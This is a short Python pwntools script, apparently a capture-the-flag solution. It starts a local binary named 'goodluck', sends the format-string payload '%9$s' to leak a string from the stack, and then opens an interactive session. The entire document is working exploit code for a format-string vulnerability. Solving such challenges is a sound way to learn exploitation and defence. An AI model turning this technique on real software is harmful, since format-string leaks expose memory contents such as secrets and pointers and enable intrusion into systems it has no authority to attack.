from pwn import *

sh = process("./goodluck")

payload = "%9$s"

sh.sendline(payload)
sh.interactive()